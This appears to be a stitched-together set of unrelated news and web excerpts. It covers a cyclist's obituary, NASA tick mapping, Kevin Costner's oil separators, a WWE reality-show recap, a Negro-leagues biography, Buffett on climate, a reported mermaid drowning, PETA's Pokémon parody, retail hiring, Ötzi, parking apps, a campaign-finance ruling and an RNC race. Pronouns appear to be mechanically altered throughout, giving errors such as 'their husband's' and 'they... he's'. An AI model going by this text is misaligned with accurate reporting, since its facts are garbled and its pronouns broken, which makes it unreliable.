They were a cautious cyclist who wore safety gear and used a bike light in the daytime, said their oldest daughter, Whitney Umino, 37, of Chicago.
“Nothing about this makes sense. He's the most careful rider I've ever seen,” said Stephanie Carpenter, a family friend and fellow cyclist.
They often would drive to Two Rock Valley Presbyterian Church from their home in west Petaluma to start their rides on roads that weren't main thoroughfares, said Whitney Umino and their sister, Mallory Umino, 31, of Petaluma.
They made donations to the congregation for the regular use of their property, Mallory Umino said. They parked there Wednesday, their daughters said, but sometimes major roads are unavoidable.
The family did not dispute the CHP's initial account of the accident. Newman did not witness it, family members said, and was unavailable Friday for an interview.
Mallory Umino, meanwhile, voiced concern for Davis' feelings in the aftermath of the crash.
Paul Umino practiced for years with El Rose Medical Group, caring for thousands of patients in Petaluma and making regular house calls until their retirement, according to their daughters.
The son of Japanese-American parents who'd been interned in an Arkansas camp during World War II, they were born Sept. 2, 1943 — outside of confinement in Pennsylvania, due to the sponsorship of a local family — and moved when they were 4 years old back to California, where they were raised alongside three brothers on a Tulare County fruit and vegetable farm.
They served in the Air Force in the Aleutian Islands and at Travis Air Force Base during the Vietnam War.
They studied pre-med at UC Davis and medicine at Creighton University.
They took up cycling about 20 years ago after they won a few thousand dollars playing craps at a casino outside of Lake Tahoe, their daughters said.
They used their winnings to buy a road bike and a mountain bike, Whitney Umino said.
“My dad was into cycling before it was cool,” they said.
After they retired, in addition to cycling, they devoted their time to their family, their garden, cooking with Newman, their partner, and bird watching, often at Ellis Creek with their yellow lab, Charlie, their family said.
In addition to their daughters, Whitney and Mallory, they are survived by sons Patrick, 40, and Marcus, 35.
A public memorial service will be held at 10 a.m. Oct. 4 at the Ellis Creek Wetlands, 3890 Cypress Drive, Petaluma.
In lieu of flowers, the family asks that donations be made to the Petaluma Wetlands Alliance.
May 28, 2010: Finding a tick usually involves a squeamish self-examination – carefully rubbing fingertips through the scalp, meticulously scanning the body, and groaning "eyeww" if a little bloodsucker is discovered.
Blacklegged ticks are known as one of the disease transmitting organisms for Lyme disease. (Credit: CDC)
Now, there's a new way to find the pesky, disease-laden critters--via satellite!
University of Alabama at Birmingham graduate students Nathan Renneboog and Stephen Firsing are pioneering the new technique as part of a NASA program called DEVELOP. They've been using satellite images of Alabama's Talladega National Forest to reveal areas of the forest where ticks likely flourish.
Knowing tick whereabouts is important. Ticks can deliver some very unwelcome visitors into your bloodstream: the toxins and organisms that cause Rocky Mountain Spotted Fever, Southern Tick Associated Rash Illness, and Lyme Disease.
"Our goal was to identify high-risk zones for these diseases," explains Renneboog. "We know that ticks prefer moist, heavily vegetated areas, so we wanted to map those areas."
Tick hosts include white-tailed deer, white-footed mice, and you. Lurking like mini-vampires, ticks wait for one of these unsuspecting passersby on whom to feast. Without blood meals, ticks die. Some ticks' saliva contains a blood thinner to make it easier for them to feed. The saliva may also contain neurotoxins that keep you from feeling pain as the tick digs its barbed mouth into your skin and enjoys a meal at your expense.
Likely tick habitats related to high NDVI (Normalized Difference Vegetation Index) and soil moisture levels were identified around the Black Warrior River in Central Alabama.
Dr. Jeff Luvall of NASA's Marshall Space Flight Center mentored Renneboog and Firsing in their tick hunt, which took place in UAB's Laboratory for Global Health Observation. "I taught the students how to use infrared images from an instrument on the Terra satellite to analyze soil moisture and vegetation."
The two students used what they learned from their NASA advisor to classify levels of vegetation and moisture in 12 locations in the forest. They then created detailed digital maps and images showing likely tick habitats – areas where dense vegetation overlapped those with high soil moisture.
To confirm that the maps were accurate, Renneboog and Firsing needed some old-fashioned, ground-level tick counts for comparison. They used data provided by Jacksonville State University faculty and students, who collected ticks by dragging large white clothes through bushes and grasses. They actually counted the ticks by hand and identified their species.

"One of our aims for this study is to raise awareness about ticks – where they live, how they behave, what diseases they carry," adds Firsing. "For example, it's not widely known that there's Lyme disease in Alabama now. But there is and has been for a while. The first case was actually documented in this state in 1986."
As part of their DEVELOP project, Renneboog and Firsing do outreach work, presenting their findings at conferences and talking to the public. This summer, for instance, they'll work with Girl Scout Troops.
"We'll teach them to use repellents, wear long pants, tuck in their shirt, and wear socks when they go into the woods," says Renneboog.
"And we'll teach them how to properly remove a tick if it latches onto them," adds Firsing. "You need to use tweezers. If you try to pinch the tick's body with your finger tips and pull the tick off, you'll squeeze it, and the tick will regurgitate the contents of its gut into your bloodstream."
Eyeww!
"That's how they infect you," they say.

For 15 years, Kevin Costner has been overseeing the construction of oil separation machines to prepare for the possibility of another disaster of the magnitude of the 1989 Exxon Valdez spill.
Does this evoke their tagline from “Field of Dreams?” It seems that Mr. Costner, the 55-year-old actor, environmental activist and fisherman, was ready for the current spill in the gulf.
Disturbed by the effects of the Valdez spill in Alaska, Mr. Costner bought the nascent technology from the government in 1995 and put $24 million of their own money into developing it for the private sector.
“Kevin saw the Exxon Valdez spill, and as a fisherman and an environmentalist, it just stuck in their craw, the fact that we didn't have separation technology,” said John Houghtaling, Mr. Costner's lawyer and business partner as chief executive with Ocean Therapy Solutions, which developed the technology.
Mr. Costner's brother, Dan, is a scientist who worked on the project and was also in New Orleans this week.
On Wednesday, BP's chief operating officer, Doug Suttles, said that the company had approved six of Ocean Therapy's 32 machines for testing. All boast centrifuge processing technology — giant vacuum-like machines that suck oil from water, separate the oil, store it in a tanker and send the water, 99.9 percent purified, back into the gulf.
“I'm very happy the light of day has come to this,” Mr. Costner said at a news conference in New Orleans. They said they were “very sad” about the spill, “but this is why it's developed.”
“It's prepared to go out and solve problems, not talk about them,” the actor said of the technology.
Mr. Houghtaling of Ocean Therapy Solutions said that the company had trained independent contractors and were bringing in scientists from U.C.L.A. to deploy the machines, which were waiting on a barge in Venice, La., on Wednesday afternoon.
The technology was available for use 10 years ago, Mr. Houghtaling said. “These machines have been very robust, but nobody's been interested in them until now,” they added.
BP officials and Ocean Therapy are working to determine where best in the gulf to test the machines, and if all goes well, the technology will be running within the week, they said. “We just need the green light from BP.”
They said that the largest four machines have the capability of separating 210,000 gallons of oil from water a day, 200 gallons a minute.
• Kick off! The judges take turns quickly giving each participant a piece of advice. Great little add-in. However they've re-added the long bouts of clapping before and after the break, and the awful generic pop soundtrack is more pervasive than ever.
• Amanda is happy to have their looks help them get to the top, and ZZ is shown sulking about nobody wanting them here. They look like he's lost weight (later they say 8 pounds). This week's challenges centre around pairing up and teamwork.
• Challenge 1: Work together for a quick in-ring sequence. Billy reads ZZ the riot act for gassing out in 2 minutes. A big hoopla is made over Sara Lee botching a powerslam (Daniel Bryan rightly points out it didn't look that bad, as is disappointed in Gigi for playing it up), whilst Josh & Tanner kill it, winning the challenge. Josh gets the shine – He's the guy WWE want, as the tallest/biggest guy. He's put over as super-focused and capable. I get this is a reality show so they need to show “interesting” activities to grab ratings, but how is this a decent evaluation of in-ring talent? How is any of this useful?! 😀
• Miz oddly heels out on the fans, calls ZZ a lazy underachiever ‘which the fans can relate to'. Everyone reacts mildly surprised.
• Josh offers Tanner to hit on them to up their game (e.g. pretend I'm a woman) real reality TV fodder. They play it up on Tough Talk, boo.
• Challenge 2: Fireman (not the carry) rescue exercise – attach a hose to a fire hydrant, put out a fire, find a dummy survivor and get out. featuring the Prime Time Players! They show up with their tag belts. This sequence is INTENSELY edited (even for a reality show) so it's just a mess. ZZ (who has experience as a volunteer firefighter) and Tanner do the best, giving ZZ some much-needed props. Josh is shown as doing almost everything himself, but this doesn't bite them in the ass.
• Calmer hen clucking as Chelsea admits to intentionally not working together with Amanda, wanting to stand out regardless of instructions. She's gonna get put in the bottom 3 for that remark.
• BOTTOM 3: Amanda (Miz, a segment early, says them saving them went straight to their head) Gigi (Bryan, for over-reacting about the powerslam) and Sara Lee (Paige, for not apologising after botching the powerslam). So…none of those are really teamwork reasons, which the challenges centred around. Hang on! AMAZING swerve by Miz, they change their nomination to Chelsea, for awful teamwork. What a troll.
• Final 30s Plea: Sara-Lee (“I'm here to learn” – meh), Gigi (“I need to be here” – very good), Chelsea (heelish “I deserve to be here” – good, but you won't win sympathy with it). Weird to see an all-female bottom 3, first time that's happened. Paige saves Gigi (which gets a big pop – they would've gone home), meaning Chelsea's fucked. As the 2nd lowest with 25%, Chelsea's gone. They put over Gigi to win it, and we're done
Overall: Oh man, it's difficult to find things to praise about this week's show. Em…my 5 minute review will save you watching 90 minutes?
TOUGH TALK
• Hilarious new graphic. I didn't see the ring ropes for DB and Paige, thought they were posing like rappers. B Dazzle is back! They have to be prodded so say anything – their head was somewhere else this week. They just keeps grinding the same point about Chelsea playing up whining about a somewhat dangerous powerslam.
• Amanda: Paige says they would've nominated them for elimination, but didn't as Miz said they would. They make Amanda out to look really bad, very shallow, and is put in a tight position and ends up slagging Chelsea's looks. They should've referenced that they came to Chelsea nicely about their poor performance in the challenge, who responded by saying she's basically going into business for herself.
• Gigi: Frustrated that she's was in the bottom 3, as she's been performing in challenges. Paige has really toned it down this week – great! – they give out that TE is a popularity contest, indirectly jabbing Sara Lee. 52% of the votes! Take that WWE! This “Sara's a liability” conversation lasts an ice age. They butt in to defend herself, giving us a perfect visual of Tough Enough and the fans' (and my) voting preferences.
• The next 10 minutes is spent burying ZZ: Miz likens them to Daniel Puder (the fan favourite who was gone a year later). Kurt must not be anywhere close to coming back to WWE, but I appreciated the Tough Enough Season 4 reference. (Angle was embarassed by MMA-background Puder in a quickie shoot-fight on Smackdown – the most notable thing to come out of ANY tough enough season). Bryan HOUNDS ZZ about basically lying about wanting to get in shape. Smartly (and very tellingly) Miz asks about ZZ being a three-time Reality show star (the implication being ZZ's not interested in being a wrestler). FYI, ZZ was on “Trading Spouses” when their mother traded places with a vegan mom when they were 8, and again was “Swamp People” when they were 16.
• Force that Josh/Tanner bromance deal again and we're done.
Overall: Sadly it's another forgettable week, Byron Saxton did a poor job keeping Tough Talk moving along, and it's not enjoyable seeing WWE bury ZZ or making Amanda look bad. It doesn't work well to have your top babyface as boring heel with no-one to take their place. But hey, Tough Enough is about people wanting to become wrestlers, and so it's always interesting to me. It feels like Lance Storm's students (Chelsea & Gigi) are the only actually decent hires out of the bunch (I can't see Josh, Tanner or ZZ becoming anything/sticking around long term). Nevermind though, there's only 3 weeks left! And Cena'll show up next time.
Norman Thomas "Turkey" Stearnes (May 8, 1901 – September 4, 1979) was an African American outfielder in the Negro leagues. They were elected to the Baseball Hall of Fame in 2000.
Career [ edit ]
Born in Nashville, Tennessee, Stearnes acquired their nickname at an early age from their unusual running style. They began their career in professional baseball in 1920 with the Nashville Giants, then played for the Detroit Stars, beginning in 1923. In 1931, the Stars failed to pay Stearnes their salary because of the Great Depression, so they moved from team to team for the remainder of their career, retiring in 1942 as a member of the Kansas City Monarchs.
Stearnes is considered by some as one of the great all-around players in the history of baseball, but because of their race and their quiet personality, they never received the recognition that many believe they deserved. They batted over .400 three times and led the Negro leagues in home runs seven times.  They are credited with 176 home runs in their Negro league career, the all-time Negro league record, and 50 more than second-place Mule Suttles. Since Negro league seasons were very short, sometimes lasting fewer than 30 games, it is unclear how many home runs Stearnes might have hit in a 154-game major league season. The 175-pound Stearnes was a fast baserunner despite their awkward-looking running form, and was one of the best outfielders of their generation. In 2001, writer Bill James ranked Stearnes as the 25th greatest baseball player of all-time and the best left fielder in the Negro leagues.[2]
Stearnes' known career statistics include a .344 batting average, 176 home runs, 750 games, and a .621 slugging percentage.
Other work and later life [ edit ]
Despite their accomplishments, Stearnes had to work winters in Detroit's auto plants to survive, primarily in a factory owned by Walter Briggs, who was the owner of the Detroit Tigers, a team they couldn't play for because of their skin color.
Stearnes was inducted into the Hall of Fame in 2000, 21 years after their death in Detroit. Their wife, Nettie Mae, a schoolteacher, who was instrumental in their husband's posthumous induction, died in 2014.
A plaque in Stearnes' honor is on display outside the centerfield gate at the Tigers' home field, Comerica Park.

Warren Buffet has repeated their inconvenient message from last year, that climate has not affected their insurance business – though they are concerned about future climate change.
Warren Buffett says global warming is not impacting the way Berkshire writes insurance
Tom DiChristopher
Monday, 27 Feb 2017 | 3:34 PM ET
Berkshire Hathaway CEO Warren Buffett on Monday said they have not yet seen sufficient evidence that climate change is affecting weather events to a degree that would make them change the way their conglomerate's insurance businesses write policies.
Events such as Hurricane Sandy have raised concerns that global warming is increasing the intensity and frequency of so-called superstorms.
“I have not seen anything yet that would cause me to change the way we look at evaluating quakes, tornadoes, hurricanes by atmosphere. Now, that may happen some day,” they told CNBC's “Squawk Box.”
…
Research shows it is premature to conclude greenhouse gas emissions from human activities “have already had a detectable impact on the Atlantic hurricane or global tropical cyclone activity,” according to the National Oceanic and Atmospheric Administration.
…
“It seems highly likely to me that climate change poses a major problem for the planet. I say ‘highly likely' rather than ‘certain' because I have no scientific aptitude and remember well the dire predictions of most ‘experts' about Y2K,” they wrote in last year's shareholder letter.
“It would be foolish, however, for me or anyone to demand 100% proof of huge forthcoming damage to the world if that outcome seemed at all possible and if prompt action had even a small chance of thwarting the danger.”
mermaid
In a rather stranger than fiction case, which left people at Village Seven under Chief Nemangwe in Gokwe shocked, two boys died under unclear circumstances after they were reportedly snatched by a suspected mermaid at Pachemumvuri Dam.
It is reported that the mystical creature first pulled the boys, who were playing near the dam, underwater only to resurface with them alive.
While adult witnesses, who had gathered at the scene when the boys first disappeared, were counselling the children on a rocky outcrop near the dam their hysterical parents appeared.
It is said the parents made the mistake of crying about the near death experiences of the boys and the mermaid grabbed the two minors again and disappeared underwater. This time for good.
Traditionally, it is believed that when a person is taken by a mermaid people are not supposed to cry as doing so can lead to dire consequences, leading to the death of the victim. Police have since launched investigations into the case.
Acting Midlands Provincial police spokesperson Assistant Inspector Ethel Mukwende said investigations were in progress to ascertain what really transpired.
“I can confirm that we are investigating a case of sudden death by drowning which occurred at Village Seven under Chief Nemangwe on 19 February at around 12pm when two minors who were herding cattle drowned and their bodies were later retrieved by fellow villagers,” they said.
Before the incident, the creature had reportedly been seen on the banks of the dam several times. Confirming the shocking incident Chief Nemangwe whose jurisdiction the area falls under said a cleansing ceremony had since been conducted at the dam to calm the water spirits.
“It is reported that on the fateful day the two boys who were in Form One and Two at Ganye Secondary School were herding cattle when they saw the mermaid at the dam.
“According to a friend of the deceased boys, their companions jumped into the dam and tried to grab the mermaid because they believed it was just a big fish.
“But the mermaid pulled them down into the water,” said Chief Nemangwe.
The friend then ran home to alert the elders, who arrived at the dam to find the boys lying on a rock, alive.
“When their parents got to the dam they panicked believing their children had died and started crying.
“A whirlwind suddenly engulfed the place before the mermaid swiftly appeared from the water and grabbed the boys for the second time but this time their lifeless bodies resurfaced later,” said Chief Nemangwe.
According to the chief the latest victims were not the first to meet their demise at the dam under mysterious circumstances.
“Two other people that I am aware of were also killed at the same dam in similar circumstances. As a community we have since performed some rituals to calm down the water spirits. During the ceremony we slaughtered a beast and the meat was consumed without salt,” said Chief Nemangwe.
Work on the pumps at Sengwa 2/Gwehava Dam in Gokwe once stopped after terrified workers complained of machines breaking down under mysterious circumstances, and blamed mermaids. The work later resumed after traditional healers brewed beer and carried out some rites to appease the water spirits.
A mermaid is a legendary aquatic creature with the upper body of a female human and the tail of a fish. Mermaids appear in the folklore of many cultures worldwide, including the Near East, Europe, Africa and Asia.
PETA have released 'Pokémon Black and Blue:' another title in their line of parodies, which makes comparisons between the in-game fictional characters and real-world animal cruelty.
The game follows the same RPG structure as Game Freak's popular series; but with a rather dark undercurrent of animal mistreatment to put PETA's point of protest across. You play as Pikachu touring the Unova region, gathering a team of abused Pokémon and fighting with human trainers in the classic turn-based battle structure. Each of these trainers represents a pet peeve of the protest group. Professor Juniper is now a scientist who performs harmful experiments and product tests on the Pokémon, and your original trainer is a crazed maniac who enslaves Pikachu in a spiked chain.
The amount of time that Pokémon spend stuffed in pokéballs is akin to how elephants are chained up in train carts, waiting to be let out to "perform" in circuses. But the difference between real life and this fictional world full of organized animal fighting is that Pokémon games paint rosy pictures of things that are actually horrible.
This, of course, isn't the first time PETA have used video games to get their point across, creating Super Tanooki Skin 2D last year. Backfiring slightly, it forced the group to issue a statement asking enraged fans to "relax." We await Pokémon fans' reaction to this particular parody. Have a go below and tell us what you think in the comments.

7. GameStop
> 2014 seasonal hires: 25,000
> Change from 2013: +8,000
> Total employees: 17,000
> U.S. stores: 4,467
Video game retailer GameStop announced plans to hire 25,000 seasonal workers, up from 17,000 the year before. The company anticipates that new games for next-generation video game consoles — Sony's PlayStation 4, Microsoft Xbox One, and Nintendo's Wii U — will help drive demand. GameStop also stated that its “consumer electronics re-commerce business is expected to be in demand as customers look to trade in their pre-owned devices in order to trade up to the new Apple iPhone 6 or iPhone 6 Plus.” The holiday season is critical for GameStop. Its fourth quarter, which coincides with the holidays, accounted for more than 40% of sales and for nearly two-thirds of its operating profit excluding non-recurring items in the last two years.
6. J.C. Penney
> 2014 seasonal hires: 35,000
> Change from 2013: 0
> Total employees: 117,000
> U.S. stores: 1,094
The second quarter provided further fuel for J.C. Penney's recovery, as sales rose 5.1% from the same period the year before and comparable store sales increased by 6%. The company also significantly pared back its losses by improving its cost structure. Still, J.C. Penney's cash balances continue to dwindle, and many on Wall Street — including Credit Suisse and Standard & Poor's — have reported that the company's future remains in flux. The holidays will likely be a critical moment for the retailer's turnaround plans. J.C. Penney has announced plans to hire roughly 35,000 seasonal employees for the holidays, in line with the number hired last year.

> 2014 seasonal hires: 45,000
> Change from 2013: 0
> Total employees: 67,000
> U.S. stores: 873
Perhaps even more than other retailers, Toys R' Us relies heavily on the gift-giving season. The company's unprecedented and controversial Black Friday sale — which started at 5 p.m. on Thanksgiving last year, three hours earlier than any other retailer — is a testament to its commitment to the holiday season. This September, Toys R' Us announced it will again hire an additional 45,000 employees nationwide to accommodate holiday shopping. The surge will more than double the company's U.S. workforce and offer seasonal workers opportunities for non-seasonal employment, according to Toys R' Us.
4. Wal-Mart Stores
> 2014 seasonal hires: 60,000
> Change from 2013: +5,000
> Total employees: 2.2 million
> U.S. stores: 4,835
Walmart plans to swell its ranks by 60,000 this holiday season, a nearly 10% increase from last year's seasonal hiring. The retailer has also ensured current employees will have priority over seasonal workers for extra hours. Sending the message that the company takes care of its employees is timely as Walmart's labor practices have been frequently criticized in recent years. Walmart had to deal with worker strikes and, in January, the National Labor Relations Board issued a complaint against Walmart accusing the company of unlawfully having “threatened, disciplined, and/or terminated employees for having engaged in legally protected strikes and protests.” Walmart employed 1.4 million Americans, and operated 4,835 stores in the U.S., at the end of its last fiscal year.

September 19th, 1991. Two German hikers were on their way up through the Ötztal Alps when they discovered a well-preserved human mummy – the oldest ever found in Europe. The controversial discovery was made in Hauslabjoch, on the border between Austria and Italy. It led to numerous hypotheses regarding how old the man was they when they died, how they died, in what state of health they were when they met their unfortunate end, and above all what they're doing there high in the snow-covered Alps.
Ötzi shortly after the discovery of the body in September 1991, when it was still frozen in the glacier and had not yet been removed
Also known as the Tyrolean Ice Man, Ötzi was found to be about 45 years old when they died and was discovered equipped with many tools such as a stone axe, an unfinished bow stave, a leather quiver, and a backpack frame made of larch and hazel. At the time, some of these items were only supposed to have been in use about a thousand years ago. A lot of research has been done on Ötzi's frozen remains, and archaeologists believe that they perhaps existed during the Neolithic Copper-Age Transition in Central Europe more than 5,000 years ago.
The study of Ötzi's bodily tissues indicate the their death perhaps occurred somewhere around 3,200 BC. (Radiocarbon dating is a technique used to determine the age of ancient archeological objects as old as 50,000 years old.)

The controversy: Was Ötzi a shaman or a shepherd?
Like I said, Ötzi's body was remarkably well-preserved, as was their clothing. It soon became a serious matter of discussion among scientists, researchers and archaeologists as to whether they had been a shaman or a shepherd? The first theory says that since Ötzi was found equipped with tools such as arrow shafts, a longbow made of yew and a stone knife, perhaps they were simply a shepherd. However, not everyone agrees.

As soon as Uber and Lyft reinvented driving, entrepreneurs cast about for the next unloved slice of the economy to upend. They found it in parking.
Everyone agrees that urban congestion is bad almost everywhere and that the search for street parking is a significant part of it. Drivers hope against hope, looking for something cheaper and more convenient than a garage. In the meantime, they get in the way of those heading somewhere else. In one study of a 15-block stretch of New York's Upper West Side, motorists were estimated to “cruise” a total of 366,000 miles a year searching for street parking — farther, the study noted, than a one-way trip to the moon.
Special Section: Transportation A look at how technology is changing how we get around
Entrepreneurs have been trying to solve such problems with clever fixes. Yet one of their first big solutions was met with a resounding “no,” a rare rejection in a culture where almost anything tech has at least some defenders. In this case, regulators rattled their legal fists, politicians declared that this must not stand, and columnists dispensed ridicule.
The source of all the ire? Apps that tried to balance minimal supply and heavy demand for curb slots. The apps would allow drivers to bid for parking spaces that others users were vacating. When those drivers in turn moved on, they could build credit by selling their space.
The problem, of course, was the apps were selling something they did not own. The two that briefly achieved the most momentum, or perhaps notoriety, were MonkeyParking and Haystack.
“Haystack was dubbed ‘jerk tech,' ” said Eric Meyer, the 25-year-old Baltimore entrepreneur who developed the app. “It took us a bit by surprise.”
Hoping to use the Uber model of operating first and asking permission later, Haystack got a second surprise when Boston made it illegal last summer before the app could gather a crucial momentum with users.
San Francisco banned MonkeyParking as well as two similar apps, Sweetch and ParkModo. The latter, which was on the verge of starting its service, planned to pay agents in the city's crowded Mission District $13 an hour to squat in spaces until they were needed, the city attorney's office said. In a working-class neighborhood that is rapidly filling with well-heeled tech workers, that business plan would have drawn widespread attention.
Mr. Meyer is still a little bitter. “Cutting innovation off at the knees does not do any good for anyone,” they said.
In this case, however, it actually might. Silicon Valley entrepreneurs are now tackling the parking problem with renewed vigor and have come up with another solution, one that has fewer regulatory or public relations hurdles: valet parking on demand.
Like all the best innovations, it is simple. A driver presses an app and rolls up to their destination. An agent arrives to take their car away for however long they want. Ready to go home? Press the app again.
Sean Behr, chief executive of the valet company Zirx, notes that Uber strikes most initial users as “a magical experience. But sometimes you have to drive, so you go to a garage. The number of steps is amazing. I give them my car, they give me a little piece of paper, I walk four blocks to my meeting, now I'm late, and then I come back, hand them the piece of paper, wait 10 minutes for my car. This is not magic.”
Zirx, which received $30 million in financing at the end of April, is now in portions of Los Angeles, San Francisco, San Diego, Seattle, Washington and, as of this month, Brooklyn. It has around 300 “agents,” as it calls the valets, who the company says can make up to $30 an hour and can get free food.
The price for a valet service, which can indeed seem magical to customers, averages $15 for an entire day. But there are questions about whether valets are this boom's equivalent of Kozmo.com, the dot-com wunderkind that delivered pints of ice cream in an hour for no fee. Kozmo closed in 2001 after blowing through $250 million in venture capital.
Mr. Behr said the business model involved more than valets. “Once I have your keys for an extended period of time, there are interesting things I can do,” they said. “We view parking as an entry point to providing a suite of services — gas, car wash, oil changes.”
Some analysts are skeptical. “Right now we're talking about solving a problem for affluent people in the Bay Area and a handful of other cities,” said Julie A. Ask, a mobile analyst for Forrester. “I can't see valet as something that is too big.”
The start-ups are now competing in earnest. Another service based in San Francisco, Luxe Valet, received $20 million in venture funding in February. A well-publicized third app in San Francisco, Caarbon, is starting out by invitation only.
No true entrepreneur is fazed by competition, and Mr. Behr is not. “This is an easy business to start, but a very difficult business to scale,” they said. “If I add 40 percent more cars tomorrow, I have to physically put them somewhere.”
Other entrepreneurs are pushing parking from a different direction. ParkMe.com, based in Santa Monica, has a database of 81,000 parking locations in 57 countries, about 5,000 of which a user can reserve.
“We're in a weird period with parking,” said Mark Braibanti, director of marketing and business development for ParkMe. “We don't have the ability yet to automate everything and turn it all over to self-driving cars, but we do have the technology to help drivers get all the information they need and match them with other parties.”
The irony of the parking apps, of course, is that the more of them there are and the better they work, the more they will influence drivers to think that driving yourself isn't so bad. That will in turn contribute to the problem parking apps are trying to solve.
Donald Shoup, a professor at the University of California, Los Angeles who wrote “The High Cost of Free Parking,” says they believe, “We're just at the cusp of a big change in parking,” but it will be led by cities, not Silicon Valley entrepreneurs. Valet and parking apps show the problem, they said, but only nibble away at the edges. A better idea: Smart meters that adjust prices for demand, which have been successful in San Francisco and are being adopted elsewhere.
Dr. Shoup pointed to the Southern California city of Ventura, which installed metered parking in a part of the downtown that did not have it before. There were some early grumbles from worried merchants, but the move opened up space previously used by store employees to park all day. The money that the meters earned paid for free Wi-Fi and increased security.
“Why should an app developer get all the money from underpriced curb parking when the city could be getting it?” Dr. Shoup asked. “This could be a new source of revenue and greatly reduce congestion as well.”
Convinced we don't have quite enough cash sloshing around the American political system already, the Supreme Court did the nation's super rich a solid on Wednesday and made virtually certain that legal corruption in elections will reach great new heights in the near future.
In yet another one of those sharply ideological 5–4 decisions that have become standard in recent years, the court's conservative majority struck down federal limits on the "aggregate" (or total) amount citizens can donate to candidates and political committees during a given election cycle, overturning established law and making a pretty twisted mockery of the still commonly held idea that ours is a legitimately democratic society.
The decision follows in the warped tradition of the notorious 2010 Citizens United ruling that opened the floodgates for unlimited corporate money in US elections and gave birth to that uniquely American monster known as the Super PAC—groups that are free to raise as much money as they can squeeze from the rich. Embraced first by conservative business barons and subsequently by cynical, terrified Democrats like Barack Obama, these political action committees on steroids can be traced directly to the dark recesses of Chief Justice John Roberts's brain.
"Roberts thinks that the First Amendment protects everything except actual bribery, and they think spending money is pure speech," said Trevor Potter, the former chairperson of the Federal Election Commission and founder of the Campaign Legal Center. (In 2012, Potter helped Stephen Colbert to create a Super PAC in a made-for-TV stunt that showed viewers how twisted the system had become.)
"Money in politics may at times seem repugnant to some, but so too does much of what the First Amendment vigorously protects," Roberts wrote in their opinion. "Spending large sums of money in connection with elections, but not in connection with an effort to control the exercise of an officeholder's official duties, does not give rise to... quid pro quo corruption. Nor does the possibility that an individual who spends large sums may garner 'influence over or access to' elected officials or political parties."
In other words, Roberts believes that the only form of corruption possible is the mythical scenario in which an elected official is given a bag of cash in exchange for a vote on a piece of legislation. But it is much more common for banks, energy companies, and other corporate interests to deploy their vast resources to prop up entire movements that implicitly or explicitly advocate for their interests. Corporate lobbyists don't trade cash for votes—they threaten to support the electoral opponents of members of Congress who vote against their "cause" and ply friendly legislators with golf trips to exotic lands and other assorted goodies less easily traced than money. Then again, according to Roberts, trading favors isn't a problem because money is speech, baby, and the losers who don't have any should shut up and stay on the sidelines of public life.
"It's part of a step-by-step effort by the majority on the Supreme Court to basically destroy the campaign finance laws," said Fred Wertheimer, the president of Democracy 21, a group that advocates against money in politics.
The case sprang from a legal challenge launched by Alabama business person Shaun McCutcheon, who, after donating $33,000 to various candidates in 2012, decided that in order to make their voice heard they needed to donate the patriotic amount of $1,776 each to 12 more campaigns. That would have put them over the $48,000 limit in total donations to candidates during one election cycle permitted by federal campaign finance regulations (which they knew perfectly well when they attempted to donate, since this was a conscious step toward striking the law down). Feigning outrage at the inability to speak freely via a plus-size bank account, McCutcheon is now convinced a new day has arrived for the enterprising, successful people of this country such as himself.
"I hope that it actually brings more money into politics," they told me when I reached them by phone, a thick Southern drawl serving as a sort of comforting filter for terrifying ideas about how power should work in America. "This is supposed to be a free country. I don't know why anyone would want to limit the dissemination of ideas, especially political ideas. I guess they don't like freedom."
What "freedom" means here is that the 646 Americans who hit the roughly $120,000 cap for total giving (to candidates and to committees) during the 2012 cycle are about to have a whole lot more influence over the country the rest of us will be living in for years to come. And the lobbying industry will explode because those professional influence peddlers hired by corporations and other interest groups, already expected to bundle and funnel campaign contributions, will (like everyone else) no longer be subject to any limits on political giving. Ironically, their lives could actually grow more stressful even as their sway over US policy grows.
"Lobbyists will think, Oh, no, now we have no place to hide," said Jeff Connaughton, a recovering Washington lobbyist and former top aide to Vice President Joe Biden. "I used to breathe a sigh of relief [as a lobbyist] when I hit the cap. Now the campaign finance system is going to both empower lobbyists further and squeeze them harder."
Despite the dire state of affairs—and perhaps because I sounded despondent—some reformers I spoke to insisted that even if the decision could set the stage for totally gutting the few remaining laws limiting money's influence on politics, the apocalypse is not nigh.
"Before we slit our wrists, there are policies that can deal with this," said David Donnelly, executive director of the Public Campaign Action Fund, ticking off various state-based efforts to curb political corruption, before acknowledging that what had been one of the more promising ones—the push in New York to expand New York City's small-dollar matching system statewide—just got killed by neoliberal Governor Andrew Cuomo during the latest round of budget wrangling in Albany. Somewhat more promising reform drives continue in states like California.
Florida Representative Alan Grayson, a Democrat who told me that they are "literally the only member of Congress who received most of their campaign funds from small donors in amounts of $100 or less," expressed a certain amount of bewilderment at the gall of Supreme Court justices who don't have a realistic sense of how stuff actually gets done in the nation's capital.
"This place is just so inundated with corruption—it's steeped in corruption like a teabag," they said of DC. "There was a Roman emperor—Caligula—who appointed their horse to the senate. At this point, the system has gotten so bad that if the Koch brothers appointed their horse to the Senate, it wouldn't even make a difference. That's where we are."

A self-styled outsider conservative is preparing to challenge Reince Priebus for the leadership of the Republican National Committee if Donald Trump loses next week's election.
Priebus has worked hard to lock down enough support to handily win if they choose to run for reelection, but he's not going to go unchallenged.
Story Continued Below
Ned Ryun, a career GOP operative who is the son of former five-term Republican Congressman Jim Ryun, intends to run for head of the RNC if Trump loses and Priebus seeks reelection, two sources familiar with Ned Ryun's planning tell POLITICO.
They said that allies of Ryun, who is associated with the party's conservative anti-establishment flank, have begun quietly soliciting support for a potential bid from donors and members of the RNC's 168-member national committee.
The pitch, which is predicated on a Trump loss, includes casting Ryun as an outsider candidate who is willing to challenge a chairperson who is quite popular among party loyalists, but who would be the first RNC chairperson to preside over — and lose — two presidential elections.
Reached by phone on Tuesday, Ryun confirmed that they are planning to run if Trump loses and Priebus seeks reelection to what would be an unprecedented fourth term as chairperson.
“The priority between now and Tuesday is making sure that Hillary Clinton doesn't win the White House and that Democrats don't win the Senate. But after the election, if Trump loses and Priebus runs, I will absolutely run for chairperson,” said Ryun, who owns a political data and technology firm called Voter Gravity and runs a nonprofit outfit called American Majority that has at times been a thorn in the side of the GOP establishment.
American Majority, which has trained conservative activists to run for office, has received support from foundations associated with top conservative donors including fracking billionaire Farris Wilks of Texas, and the manufacturing mogul Uihlein family, according to an analysis of tax filings. The group also has an advocacy arm, American Majority Action, which has spent millions mobilizing voters in support of conservative Republican congressional candidates, as well as the party's 2012 presidential nominee Mitt Romney.
Ryun said, “With my background in grass roots, in data and technology, and not being an unknown quantity among mega-donors, I think I have a lot to offer for the future direction of the RNC and the GOP.”
